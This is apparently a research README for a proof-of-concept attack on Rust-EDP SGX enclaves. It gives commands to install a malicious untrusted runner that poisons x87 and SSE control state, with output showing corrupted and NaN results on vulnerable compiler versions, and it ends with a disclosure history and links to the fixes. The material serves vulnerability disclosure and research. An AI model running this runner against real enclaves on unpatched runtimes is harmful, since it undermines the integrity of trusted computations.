# Proof-of-concept Rust-EDP exploitation with malicious runner

[![build status](https://travis-matrix-badges.herokuapp.com/repos/fritzalder/faulty-point-unit/branches/master/6)](https://travis-ci.org/github/fritzalder/faulty-point-unit)

This directory includes a minimal PoC showcasing insufficient ABI sanitization
in Rust-EDP. The PoC shows that untrusted code controls x87 and SSE
configuration registers on enclave entry, which got fixed after our disclosure
in newer Rust-EDP versions. We furthermore show that the initial fix did not
suffice and attackers could still override the expected result of an exemplary
x87 FPU computation with unexpected NaN outcomes. This too got fixed after our
disclosure in newest Rust-EDP versions.

## Building and running

The untrusted runner is included in a fork of the rust-sgx repo, while the
trusted enclave runtime is part of the Rust compiler. Instructions below also
include how to easily switch between vulnerable and patched compiler versions.

### Install vulnerable Rust-EDP

#### 1. Install Rust dependencies

```bash
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
$ source $HOME/.cargo/env
```

#### 2. Switch to vulnerable Rust compiler version

```bash
$ rustup default nightly-2020-02-01
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-02-01
$ rustc --version
rustc 1.42.0-nightly (cd1ef390e 2020-01-31)
```

#### 3. Install malicious Rust-EDP runner

```bash
$ cd rust-sgx-fpu/
$ cargo install --locked --path ./fortanix-sgx-tools fortanix-sgx-tools
$ cargo install --locked --path ./sgxs-tools sgxs-tools
$ echo >> ~/.cargo/config -e '[target.x86_64-fortanix-unknown-sgx]\nrunner = "ftxsgx-runner-cargo"'
```

#### 4. Test Rust-EDP installation (only on SGX hardware)

```bash
$ sgx-detect           # Check your SGX harware setup
$ cd ../hello-world/   # Run the test enclave without poisoning
$ cargo run --target x86_64-fortanix-unknown-sgx
   Compiling cc v1.0.54
   Compiling hello-world v0.1.0 (/home/jo/Documents/faulty-point-unit/02_table2_affected_runtimes/rust-edp/hello-world)
    Finished dev [unoptimized + debuginfo] target(s) in 1.45s
     Running `ftxsgx-runner-cargo target/x86_64-fortanix-unknown-sgx/debug/hello-world`
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000
```

#### 5. Run proof-of-concept attack

##### 5.1 Vulnerable Rust-EDP version (poison SSE MXCSR + x87 control word + x87 tag)

```bash
$ rustup default nightly-2020-02-01
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-02-01
$ rustc --version
rustc 1.42.0-nightly (cd1ef390e 2020-01-31)

# First run the test enclave without poisoning
$ cargo clean
$ cargo run --target x86_64-fortanix-unknown-sgx

# Now run with the malicious FPU poisoning runner (x87 single precision, round down) --> vulnerable
$ fpu-runner --fpu=1087 ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] poisoning FPUCW with 0x43f
[enclave] Hello, world!
Pi      = 3.1411454399906846290946305089164525270462036132812500000000000000
MXCSR   = 0x5fa0
FPUCW   = 0x47f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135671854019165039062500000000000000000000000000000000000000

# Now run with the x87 FPU in MMX mode --> vulnerable
$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906846290946305089164525270462036132812500000000000000
MXCSR   = 0x5fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = NaN
```

##### 5.2 Initially patched Rust-EDP version (poison x87 tag)

```bash
$ rustup default nightly-2020-06-09
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-06-09
$ rustc --version
rustc 1.46.0-nightly (fd4b177aa 2020-06-08)

# First run the test enclave without poisoning
$ cargo clean
$ cargo run --target x86_64-fortanix-unknown-sgx

# Now run with the malicious FPU poisoning runner (x87 single precision, round down) --> patched
$ fpu-runner --fpu=1087 ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] poisoning FPUCW with 0x43f
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

# Now run with the x87 FPU in MMX mode --> vulnerable
$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906846290946305089164525270462036132812500000000000000
MXCSR   = 0x5fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = NaN
```

##### 5.3 Latest fully patched Rust-EDP version

```bash
$ rustup default nightly-2020-07-05
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-07-05
$ rustc --version
rustc 1.46.0-nightly (0cd7ff7dd 2020-07-04)

# First run the test enclave without poisoning
$ cargo clean
$ cargo run --target x86_64-fortanix-unknown-sgx

# Now run with the malicious FPU poisoning runner (x87 single precision, round down) --> patched
$ fpu-runner --fpu=1087 ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] poisoning FPUCW with 0x43f
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

# Now run with the x87 FPU in MMX mode --> patched
$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000
```

## Disclosure and mitigation

We disclosed the core FPU sanitization issue in December 2019 which was addressed with a `ldmxcsr/csw` instruction [<https://github.com/rust-lang/rust/pull/69040>].

After further investigation, we found that this left the attacker open to perform the MMX attack as described in the paper. We also disclosed this issue and it is patched in the Rust compiler in version 1.46.0. The mitigation can be followed via this Pull Request [<https://github.com/rust-lang/rust/pull/73471>].
